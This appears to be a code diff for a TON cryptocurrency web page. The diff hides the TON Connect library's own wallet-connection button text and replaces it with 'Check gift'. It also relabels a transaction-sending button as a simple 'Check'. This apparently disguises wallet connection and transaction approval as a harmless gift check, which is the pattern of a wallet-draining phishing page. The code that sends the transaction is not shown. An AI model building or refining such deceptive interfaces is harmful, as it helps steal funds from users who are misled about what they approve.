@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+\<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFT Scanner</title>
+    <title>TON Payment Scanner</title>
     <!-- Официальная библиотека TON Connect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
@@ -38,6 +38,17 @@
         #ton-connect {
             display: flex;
             justify-content: center;
+        }
+
+        /* Переименование первой кнопки в "Проверить гифт" */
+        #ton-connect button {
+            font-size: 0 !important; /* Скрываем оригинальный текст библиотеки */
+        }
+
+        #ton-connect button::after {
+            content: "Проверить гифт"; /* Задаем свой текст */
+            font-size: 15px !important;
+            font-weight: 600;
         }
 
         .wallet-details {
@@ -114,7 +125,7 @@
 <body>
 
 <div class="card">
-    <!-- Кнопка подключения кошелька -->
+    <!-- Первая кнопка "Проверить гифт" -->
     <div id="ton-connect"></div>
 
     <!-- Блок деталей, который появляется после подключения -->
@@ -122,7 +133,7 @@
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Кнопка Проверить -->
+        <!-- Вторая кнопка "Проверить" -->
         <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
